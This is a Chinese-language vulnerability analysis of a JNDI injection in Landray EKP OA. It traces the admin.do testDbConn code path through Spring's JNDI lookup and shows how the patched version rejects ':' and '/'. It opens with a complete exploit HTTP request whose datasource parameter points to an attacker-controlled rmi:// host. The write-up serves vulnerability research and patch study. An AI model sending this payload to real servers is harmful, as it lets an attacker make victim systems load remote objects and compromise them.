蓝凌oa之前有个漏洞是通过后台的admin.do触发的jndi注入漏洞，根据已有的payload进行一个代码的分析，但是手头的源码是已经修复了这个漏洞的，同时可以看看他是怎么修复的。
```java
POST /admin.do HTTP/1.1
Host: 
Cookie: JSESSIONID=90EA764774514A566C480E9726BB3D3F; Hm_lvt_9838edd365000f753ebfdc508bf832d3=1620456866; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=1620459967
Content-Length: 70
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Origin: https://X.X.X.X
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/dnslog
```

admin.do出现在ekp/ekp/WEB-INF/KmssConfig/sys/config/spring-mvc.xml中，说明具体的实现功能在SysConfigAdminAction这个类里面<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670603035762-2adeea23-7554-4a3d-9aa2-0a3a9dbf9242.png#clientId=u4697ad49-002f-4&from=paste&height=202&id=ub6d258c3&originHeight=204&originWidth=711&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17275&status=done&style=none&taskId=u7230d89c-201f-4029-8398-01ae0c51ec7&title=&width=702.7999877929688)<br />直接把lib里面的所有jar添加到依赖，然后跟进这个类，具体在kmss_core.jar里面<br />home\ekp\ekp\WEB-INF\lib\kmss_core.jar!\com\landray\kmss\sys\config\action\SysConfigAdminAction.class 在testDbConn的方法里面，datasource关联到proerties配置文件中，然后再进入createDataSource的方法里面<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670603195087-c8a9f1b8-8c11-4291-9741-cec9752d7692.png#clientId=u4697ad49-002f-4&from=paste&height=586&id=u5e672b51&originHeight=732&originWidth=1263&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67356&status=done&style=none&taskId=u128bfe9a-8722-4c46-a0c6-271b196729f&title=&width=1010.4)

具体跟进到createDataSource方法，如果datasource不为空，就进入一个判断语句判断传入的参数是否携带了:和/，如果携带了就无法进入下一步的方法，那么实际上漏洞版本的源码应该是没有这个判断语句的，所以假设不存在该判断条件，我们跟进getDataSource的方法。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670603469554-0634fa3b-3032-43b4-8c64-0ff139967b76.png#clientId=u4697ad49-002f-4&from=paste&height=417&id=ua18d7414&originHeight=521&originWidth=1486&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42598&status=done&style=none&taskId=u6e744b55-ae3e-43eb-873b-75853a2838a&title=&width=1188.8)

在getDataSource的方法里面调用了lookup的方法，继续跟进看看具体的实现<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670603598419-8e005ccf-f10f-485e-8d93-010b2b2bef8b.png#clientId=u4697ad49-002f-4&from=paste&height=147&id=u8149b034&originHeight=184&originWidth=1169&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18637&status=done&style=none&taskId=u561f54c0-8faa-4571-94c9-d61088e4466&title=&width=935.2)

跟进到home\ekp\ekp\WEB-INF\lib\spring-context-3.2.18.RELEASE.jar!\org\springframework\jndi\JndiLocatorSupport.class中的lookup方法，把dataSourceName赋值给convertedName，然后再进入getJndiTemplate().lookup()的方法中<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670603957333-c3d544dc-1173-448e-88c1-eca1d9de6444.png#clientId=u4697ad49-002f-4&from=paste&height=217&id=u150d52bb&originHeight=271&originWidth=821&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23547&status=done&style=none&taskId=u77cdd815-9b2a-4184-acc4-abeeedc091c&title=&width=656.8)

跳到了这个方法里home\ekp\ekp\WEB-INF\lib\spring-context-3.2.18.RELEASE.jar!\org\springframework\jndi\JndiTemplate.class 引用了this.lookup()<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670604107765-2ebb80d8-4e93-4536-bd39-c18d060424c1.png#clientId=u4697ad49-002f-4&from=paste&height=170&id=uce3cacc1&originHeight=213&originWidth=1073&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17271&status=done&style=none&taskId=u1d909b4d-b828-4e7e-8978-ed2cddb24e2&title=&width=858.4)

继续对this.lookup()进行跟踪，name最后会被进行ctx.lookup，典型的jndi注入漏洞代码。至此就分析完为什么datasource可以进行jndi注入了。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670604205075-531b0a8c-a45e-4e02-8ab1-c686c3b61a8a.png#clientId=u4697ad49-002f-4&from=paste&height=336&id=u3379dfdf&originHeight=420&originWidth=1170&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31576&status=done&style=none&taskId=u1a6e48d6-123b-48c7-b0e9-280abd04daf&title=&width=936)
